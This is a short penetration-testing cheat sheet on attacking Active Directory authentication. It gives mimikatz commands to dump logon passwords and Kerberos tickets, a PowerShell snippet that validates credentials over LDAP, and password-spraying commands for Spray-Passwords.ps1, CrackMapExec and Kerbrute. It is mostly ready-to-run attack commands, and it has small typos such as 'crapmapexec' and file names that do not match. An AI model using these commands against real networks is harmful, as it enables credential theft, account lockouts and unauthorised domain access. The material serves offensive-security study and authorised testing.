# AD authentication attacks

## Cached creds

https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf

```
PS > .\mimikatz.exe
m $ sekurlsa::logonpasswords
PS2 > dir \\some\smb\share
m $ sekurlsa::tickets
```

## Attacks

### Passwords

#### Principle

Lockout threshold for password attacks:
```
net accounts
```

AD authentication:
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$pdc = ($domainObj.PdcRoleOwner).Name
$searchString = "LDAP://"
$searchString += $pdc + "/"
$distinguishedName = "DC=$($domainObj.Name.Replace('.',',DC='))"
$searchString += $distinguishedName
New-Object System.DirectoryServices.DirectoryEntry($searchString, "someuser", "somepass")
```

#### Spray password attacks

Spray passwords: https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1
```
PS > powershell -ep bypass
PS > .\Spray-Passwords.ps1 -Pass somepass -Admin
```

#### SMB attacks - crackmapexec

CrackMapExec GitHub: https://github.com/Porchetta-Industries/CrackMapExec

```
kali $ vi userstohack.txt
kali $ crapmapexec smb $targetIp -u userstoattack.txt -p 'somepassword' -d targetorganisation.com --continue-on-success
```
Warning: can lock users out

#### Kerbrute

Kerbrute on GitHub: https://github.com/ropnop/kerbrute

```
PS > type userstohack.txt
PS > .\kerbrute_windows_amd64.exe passwordspray -d targetorg.com .\userstohack.txt 'somepassword'
```


